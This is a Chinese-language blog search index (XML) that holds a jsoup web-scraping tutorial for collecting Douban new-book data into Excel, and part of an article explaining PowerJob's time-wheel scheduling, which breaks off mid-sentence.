<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>java项目文件outlook邮件扫描功能实现</title>
      <link href="/2024/12/07/java%E9%A1%B9%E7%9B%AE%E6%96%87%E4%BB%B6outlook%E9%82%AE%E4%BB%B6%E6%89%AB%E6%8F%8F%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/"/>
      <url>/2024/12/07/java%E9%A1%B9%E7%9B%AE%E6%96%87%E4%BB%B6outlook%E9%82%AE%E4%BB%B6%E6%89%AB%E6%8F%8F%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Microsoft Graph API </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Microsoft Graph API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ETL数据清洗脚本kettle</title>
      <link href="/2024/11/07/ETL%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E8%84%9A%E6%9C%ACkettle/"/>
      <url>/2024/11/07/ETL%E6%95%B0%E6%8D%AE%E6%B8%85%E6%B4%97%E8%84%9A%E6%9C%ACkettle/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> kettle </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kettle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java项目文件水印功能实现</title>
      <link href="/2024/10/09/java%E9%A1%B9%E7%9B%AE%E6%96%87%E4%BB%B6%E6%B0%B4%E5%8D%B0%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/"/>
      <url>/2024/10/09/java%E9%A1%B9%E7%9B%AE%E6%96%87%E4%BB%B6%E6%B0%B4%E5%8D%B0%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java爬虫</title>
      <link href="/2024/09/06/Java%E7%88%AC%E8%99%AB/"/>
      <url>/2024/09/06/Java%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="一、项目介绍"><a href="#一、项目介绍" class="headerlink" title="一、项目介绍"></a>一、项目介绍</h2><p>jsoup 是一款 Java 的 HTML 解析器。可直接解析某个 URL 地址的 HTML 文本内容。它提供了一套很省力的 API，可通过 DOM、CSS 以及类似于 jQuery 选择器的操作方法来取出和操作数据。</p><p><strong>jsoup 主要功能：</strong></p><ol><li>从一个 URL、文件或字符串中解析 HTML。</li><li>使用 DOM 或 CSS 选择器来查找、取出数据。</li><li>可操作 HTML 元素、属性、文本。</li></ol><h2 id="二、使用框架"><a href="#二、使用框架" class="headerlink" title="二、使用框架"></a>二、使用框架</h2><h3 id="2-1-准备工作"><a href="#2-1-准备工作" class="headerlink" title="2.1 准备工作"></a>2.1 准备工作</h3><ul><li>掌握 HTML 语法</li><li>Chrome 浏览器调试技巧</li><li>掌握开发工具 idea 的基本操作</li></ul><h3 id="2-2-学习源码"><a href="#2-2-学习源码" class="headerlink" title="2.2 学习源码"></a>2.2 学习源码</h3><p>将项目导入 idea 开发工具，会自动下载 maven 项目需要的依赖。源码的项目结构如下：</p><p><img src="/img/jsoup/1.png" alt="jsoup"> </p><p><strong>快速学习源码</strong>是每个程序员必备的技能，我总结了以下几点：</p><ol><li>阅读项目 <code>ReadMe</code> 文件，可以快速知道项目是做什么的。</li><li>概览项目 <code>pom.xml</code> 文件，了解项目引用了哪些依赖。</li><li>查看项目结构、源码目录、测试用例目录，好的项目结构清晰，层次明确。</li><li>运行测试用例，快速体验项目。</li></ol><h3 id="2-3-下载项目"><a href="#2-3-下载项目" class="headerlink" title="2.3 下载项目"></a>2.3 下载项目</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;jhy&#x2F;jsoup</span><br></pre></td></tr></table></figure><h3 id="2-4-运行项目测试代码"><a href="#2-4-运行项目测试代码" class="headerlink" title="2.4 运行项目测试代码"></a>2.4 运行项目测试代码</h3><p>通过上面的方法，我们很快可知 <code>example</code> 目录是测试代码，那我们直接来运行。注：有些测试代码需要稍微改造一下才可以运行。</p><p>例如，jsoup 的 Wikipedia 测试代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Wikipedia</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Document doc = Jsoup.connect(<span class="string">"http://en.wikipedia.org/"</span>).get();</span><br><span class="line">        log(doc.title());</span><br><span class="line"></span><br><span class="line">        Elements newsHeadlines = doc.select(<span class="string">"#mp-itn b a"</span>);</span><br><span class="line">        <span class="keyword">for</span> (Element headline : newsHeadlines) &#123;</span><br><span class="line">            log(<span class="string">"%s\n\t%s"</span>, headline.attr(<span class="string">"title"</span>), headline.absUrl(<span class="string">"href"</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String msg, String... vals)</span> </span>&#123;</span><br><span class="line">        System.out.println(String.format(msg, vals));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：上面代码是获取页面（<a href="http://en.wikipedia.org/）包含（#mp-itn" target="_blank" rel="noopener">http://en.wikipedia.org/）包含（#mp-itn</a> b a）选择器的所有元素，并打印这些元素的 <code>title</code> , <code>herf</code> 属性。 <code>维基百科</code> 国内无法访问，所以上面这段代码运行会报错。</p><p>改造后可运行的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    Document doc = Jsoup.connect(<span class="string">"https://www.baidu.com/"</span>).get();</span><br><span class="line">    Elements newsHeadlines = doc.select(<span class="string">"a[href]"</span>);</span><br><span class="line">    <span class="keyword">for</span> (Element headline : newsHeadlines) &#123;</span><br><span class="line">        System.out.println(<span class="string">"href: "</span> +headline.absUrl(<span class="string">"href"</span>) );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、工作原理"><a href="#三、工作原理" class="headerlink" title="三、工作原理"></a>三、工作原理</h2><p>Jsoup 的工作原理，首先需要指定一个 URL，框架发送 HTTP 请求，然后获取响应页面内容，然后通过各种选择器获取页面数据。整个工作流程如下图：</p><p><img src="/img/jsoup/2.png" alt="jsoup"> </p><p>以上面为例：</p><h3 id="3-1-发请求"><a href="#3-1-发请求" class="headerlink" title="3.1 发请求"></a>3.1 发请求</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Document doc = Jsoup.connect(<span class="string">"https://www.baidu.com/"</span>).get();</span><br></pre></td></tr></table></figure><p>这行代码就是发送 HTTP 请求，并获取页面响应数据。</p><h3 id="3-2-数据筛选"><a href="#3-2-数据筛选" class="headerlink" title="3.2 数据筛选"></a>3.2 数据筛选</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Elements newsHeadlines = doc.select(<span class="string">"a[href]"</span>);</span><br></pre></td></tr></table></figure><p>定义选择器，获取匹配选择器的数据。</p><h3 id="3-3-数据处理"><a href="#3-3-数据处理" class="headerlink" title="3.3 数据处理"></a>3.3 数据处理</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Element headline : newsHeadlines) &#123;</span><br><span class="line">        System.out.println(<span class="string">"href: "</span> +headline.absUrl(<span class="string">"href"</span>) );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里对数据只做了一个简单的数据打印，当然这些数据可写入文件或数据的。</p><h2 id="四、实战"><a href="#四、实战" class="headerlink" title="四、实战"></a>四、实战</h2><p>获取<strong>豆瓣读书</strong> -&gt; <strong>新书速递</strong>中每本新书的基本信息。包括：书名、书图片链接、作者、内容简介（详情页面）、作者简介（详情页面）、当当网书的价格（详情页面），最后将获取的数据保存到 Excel 文件。</p><p>目标链接：<code>https://book.douban.com/latest?icn=index-latestbook-all</code></p><h3 id="4-1-项目-pom-xml-文件"><a href="#4-1-项目-pom-xml-文件" class="headerlink" title="4.1 项目 pom.xml 文件"></a>4.1 项目 pom.xml 文件</h3><p>项目引入 jsoup、lombok、easyexcel 三个库。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>JsoupTest<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.jsoup<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsoup<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.13.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>easyexcel<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-2-解析页面数据"><a href="#4-2-解析页面数据" class="headerlink" title="4.2 解析页面数据"></a>4.2 解析页面数据</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BookInfoUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;BookEntity&gt; <span class="title">getBookInfoList</span><span class="params">(String url)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        List&lt;BookEntity&gt;  bookEntities=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        Document doc = Jsoup.connect(url).get();</span><br><span class="line">        Elements liDiv = doc.select(<span class="string">"#content &gt; div &gt; div.article &gt; ul &gt; li"</span>);</span><br><span class="line">        <span class="keyword">for</span> (Element li : liDiv) &#123;</span><br><span class="line">            Elements urls = li.select(<span class="string">"a[href]"</span>);</span><br><span class="line">            Elements imgUrl = li.select(<span class="string">"a &gt; img"</span>);</span><br><span class="line">            Elements bookName = li.select(<span class="string">" div &gt; h2 &gt; a"</span>);</span><br><span class="line">            Elements starsCount = li.select(<span class="string">" div &gt; p.rating &gt; span.font-small.color-lightgray"</span>);</span><br><span class="line">            Elements author = li.select(<span class="string">"div &gt; p.color-gray"</span>);</span><br><span class="line">            Elements description = li.select(<span class="string">" div &gt; p.detail"</span>);</span><br><span class="line"></span><br><span class="line">            String bookDetailUrl = urls.get(<span class="number">0</span>).attr(<span class="string">"href"</span>);</span><br><span class="line">            BookDetailInfo detailInfo = getDetailInfo(bookDetailUrl);</span><br><span class="line">            BookEntity bookEntity = BookEntity.builder()</span><br><span class="line">                    .detailPageUrl(bookDetailUrl)</span><br><span class="line">                    .bookImgUrl(imgUrl.attr(<span class="string">"src"</span>))</span><br><span class="line">                    .bookName(bookName.html())</span><br><span class="line">                    .starsCount(starsCount.html())</span><br><span class="line">                    .author(author.text())</span><br><span class="line">                    .bookDetailInfo(detailInfo)</span><br><span class="line">                    .description(description.html())</span><br><span class="line">                    .build();</span><br><span class="line"><span class="comment">//            System.out.println(bookEntity);</span></span><br><span class="line">            bookEntities.add(bookEntity);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bookEntities;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> detailUrl</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> BookDetailInfo <span class="title">getDetailInfo</span><span class="params">(String detailUrl)</span><span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line"></span><br><span class="line">        Document doc = Jsoup.connect(detailUrl).get();</span><br><span class="line">        Elements content = doc.select(<span class="string">"body"</span>);</span><br><span class="line"></span><br><span class="line">        Elements price = content.select(<span class="string">"#buyinfo-printed &gt; ul.bs.current-version-list &gt; li:nth-child(2) &gt; div.cell.price-btn-wrapper &gt; div.cell.impression_track_mod_buyinfo &gt; div.cell.price-wrapper &gt; a &gt; span"</span>);</span><br><span class="line">        Elements author = content.select(<span class="string">"#info &gt; span:nth-child(1) &gt; a"</span>);</span><br><span class="line">        BookDetailInfo bookDetailInfo = BookDetailInfo.builder()</span><br><span class="line">                .author(author.html())</span><br><span class="line">                .authorUrl(author.attr(<span class="string">"href"</span>))</span><br><span class="line">                .price(price.html())</span><br><span class="line">                .build();</span><br><span class="line">        <span class="keyword">return</span> bookDetailInfo;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的重点是要获取网页对应元素的<strong>选择器</strong>。</p><p>例如：获取 <code>li.select(&quot;div &gt; p.color-gray&quot;)</code> 中 <code>div &gt; p.color-gray</code> 是怎么知道的。</p><p>使用 <code>chrome</code> 的小伙伴应该都猜到了。打开 <code>chrome</code> 浏览器 <code>Debug</code> 模式，<code>Ctrl + Shift +C</code> 选择一个元素,然后在 <code>html</code> 右键选择 <code>Copy</code> -&gt;<code>Copy selector</code>,这样就可以获取当前元素的<code>选择器</code>。如下图：</p><p><img src="/img/jsoup/3.png" alt="jsoup"> </p><h3 id="4-3-存储数据到-Excel"><a href="#4-3-存储数据到-Excel" class="headerlink" title="4.3 存储数据到 Excel"></a>4.3 存储数据到 Excel</h3><p>为了数据更好查看，我将通过 jsoup 抓取的数据存储的 Excel 文件，这里我使用的 easyexcel 快速生成 Excel 文件。</p><p><strong>Excel 表头信息</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ColumnData</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExcelProperty</span>(<span class="string">"书名称"</span>)</span><br><span class="line">    <span class="keyword">private</span> String bookName;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExcelProperty</span>(<span class="string">"评分"</span>)</span><br><span class="line">    <span class="keyword">private</span> String starsCount;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExcelProperty</span>(<span class="string">"作者"</span>)</span><br><span class="line">    <span class="keyword">private</span> String author;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExcelProperty</span>(<span class="string">"封面图片"</span>)</span><br><span class="line">    <span class="keyword">private</span> String bookImgUrl;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExcelProperty</span>(<span class="string">"简介"</span>)</span><br><span class="line">    <span class="keyword">private</span> String description;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExcelProperty</span>(<span class="string">"单价"</span>)</span><br><span class="line">    <span class="keyword">private</span> String price;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>生成 Excel 文件</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EasyExcelUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">simpleWrite</span><span class="params">(List&lt;BookEntity&gt; bookEntityList)</span> </span>&#123;</span><br><span class="line">        String fileName = <span class="string">"D:\\devEnv\\JsoupTest\\bookList"</span> + System.currentTimeMillis() + <span class="string">".xlsx"</span>;</span><br><span class="line">        EasyExcel.write(fileName, ColumnData.class).sheet("书本详情").doWrite(data(bookEntityList));</span><br><span class="line">        System.out.println(<span class="string">"excel文件生成完毕..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;ColumnData&gt; <span class="title">data</span><span class="params">(List&lt;BookEntity&gt; bookEntityList)</span> </span>&#123;</span><br><span class="line">        List&lt;ColumnData&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        bookEntityList.forEach(b -&gt; &#123;</span><br><span class="line">            ColumnData data = ColumnData.builder()</span><br><span class="line">                    .bookName(b.getBookName())</span><br><span class="line">                    .starsCount(b.getStarsCount())</span><br><span class="line">                    .author(b.getBookDetailInfo().getAuthor())</span><br><span class="line">                    .bookImgUrl(b.getBookImgUrl())</span><br><span class="line">                    .description(b.getDescription())</span><br><span class="line">                    .price(b.getBookDetailInfo().getPrice())</span><br><span class="line">                    .build();</span><br><span class="line">            list.add(data);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-4-最终展示效果"><a href="#4-4-最终展示效果" class="headerlink" title="4.4 最终展示效果"></a>4.4 最终展示效果</h3><p>最终的效果如下图：</p><p><img src="/img/jsoup/4.png" alt="jsoup"> </p><p>以上就是从想法到实践，我们就在实战中使用了 jsoup 的基本操作。</p>]]></content>
      
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>powerJob调度层原理</title>
      <link href="/2024/08/04/powerJob%E8%B0%83%E5%BA%A6%E5%B1%82%E5%8E%9F%E7%90%86/"/>
      <url>/2024/08/04/powerJob%E8%B0%83%E5%BA%A6%E5%B1%82%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="一、调度层概览"><a href="#一、调度层概览" class="headerlink" title="一、调度层概览"></a>一、调度层概览</h2><p>PowerJob 目前支持 4 种定时执行策略，分别是 CRON、固定频率、固定延迟 和 API。API 指的是通过 PowerJob 提供的客户端接口直接启动任务的方式，不需要 server 来支持调度，此处忽略。而剩下的 3 种调度策略，根据其执行频率的不同，可以划分为<strong>常规任务</strong>和<strong>秒级任务</strong>。我们先讲常规任务。</p><p>常规任务指由 CRON 表达式指定定时策略的任务，这一类任务的特点是 <strong>执行频率不高。</strong> 对于这类任务，PowerJob 采用基于数据库轮询的策略来进行调度，具体的原理图如下。</p><p><img src="/img/powerjob/server1.png" alt="powerjob"> </p><p>PowerJob 的任务表中，除了维护任务的基础元数据（如任务名称、定时策略、执行器信息等）之外，还会额外增加一个字段 <strong>next_trigger_time</strong>，也就是<strong>下一次调度时间</strong>，当任务被成功创建时，系统会使用 CRON 表达式去初始化该字段，保证每一个 CRON 任务都存在可用的<strong>下一次调度时间</strong>。</p><p>有了这个字段，具体的调度就好办了。powerjob-server 会启用一个后台线程定期扫描任务表，查找那些<strong>由本机调度的</strong>、即将执行（即下一次调度时间与当前时间的差值小于系统规定的阈值）的任务。</p><p>（这里埋个小小的伏笔，“由本机调度”其实是实现无锁化调度的关键，将在下一篇文章为大家揭秘，本文主要讲述调度流程，因此直接以单机为例）</p><p>一旦发现接下来的一段时间内有任务需要被调度执行，就会为这些任务生成执行记录并推入时间轮，最后完成任务的调度。</p><p>听起来似乎很平淡无奇的一个流程，存在着那些精彩的设计与实现呢？请听我细细分解～</p><h2 id="二、高性能调度——时间轮"><a href="#二、高性能调度——时间轮" class="headerlink" title="二、高性能调度——时间轮"></a>二、高性能调度——时间轮</h2><p>假如，现在给你一个任务，要求 2 秒后执行，你会怎么解决的？</p><p>最简单的方案，也就是利用休眠。1 秒后执行，那么我让当前线程 sleep 1 秒，不就达到目的了吗？没错，基于线程休眠的特性，可以用三行代码实现一个最简单的定时执行器，但是它的性能嘛…自然也是相当的拉垮…由于每一个任务都需要绑定一个单独的线程，当系统中存在大量任务时，这种方案消耗的资源极其庞大。</p><p>那么如何实现高效的调度呢？</p><p>根据前面分析，线程休眠型调度器之所以低效，是因为它需要用到大量的线程资源，这浪费了大量的 CPU 和内存资源。那么有没有办法来避免这个消耗呢？看着这个表，有人找到了答案。</p><p><img src="/img/powerjob/server2.png" alt="powerjob"> </p><p>时间轮是一种高效利用线程资源来进行批量化调度的一种调度模型。把大批量的调度任务全部都绑定到同一个的调度器（一个线程）上面，使用这一个调度器来进行所有任务的管理，触发以及运行，能够高效的管理各种延时任务，周期任务，通知任务等等。</p><p>时间轮的算法模型如上图所示，每个时间轮存在着 N 个槽，两个槽之间的间隔时间固定。每走一个时间间隔，指针就向前推进一格，然后开始处理当前槽内的所有任务。指针不断循环推进，直到时间轮中不存在任何任务。</p><p>当新增调度任务时，可根据任务的调度时间和当前时间计算出具体的时间槽。为了能以时间复杂度 O(1) 的代价将任务放入指定位置，需要时间槽具有随机访问的能力，为此该部分使用循环数组实现。每一个时间槽对应的任务队列长度不确定，且只需要提供顺序访问能力，为此任务队列使用单向链表实现。</p><p>每一个时间轮都有两个必备参数，时间间隔 tickDuration 和 刻度数量 ticksPerWheel。这两个参数也很好理解，时间间隔就是指针转动的频率，刻度数量就是这个表盘内任务槽的数量，拿现实中的手表来说，tickDuration 就是 1，ticksPerWheel 是 12。</p><p>讲了那么多理论，这里举个具体的例子来帮助大家理解时间轮（其实时间轮的概念非常好理解，具体的实现也不算很难，可以说是一种性价比超高的数据结构了～）</p><p>假如我现在有一个时间间隔为 1 秒，刻度数为 12 的时间轮，现在需要调度 3 个定时任务，分别在 1 秒、6 秒和 13 秒后执行，那么时间轮的工作流程是怎么样的呢？</p><p>首先，第一步是任务的插入。由于表盘的设计是环形数据，通过 <code>（预计执行时间 - 时间轮启动时间）% 刻度数</code> 这个公式便能算出该任务的插槽下标，即这些任务会分别被插入到 0、5 和 0 号槽对应的链表中。</p><p>完成任务的插入后，接下来就等着调度线程取出任务并执行了。调度线程通过休眠 tickDuration 的方式，循环读取下一个槽中链表中的任务并执行。由于链表中的任务可能不是本轮需要调度的（就比如 13 秒后执行的任务，其实是下一个调度周期才需要执行），需要额外对任务的预计执行时间做判断，只有符合要求的任务才会被调度执行，并从链表中移除。</p><p>这样就做到了 1 个线程完成大量任务的调度，兼备性能和效率。唯一的缺点是由于采取了 tickDuration，那么调度会存在着一定的误差。如果你对调度执行的时间精度要求极高，那时间轮可能不是你的菜，否则，还不赶紧抱走？</p><p>时间轮的概念讲完了，接下来回归框架本身。PowerJob 所使用的时间轮设计整体参考 Netty，并在一些地方做了定制化处理，比如由于 PowerJob 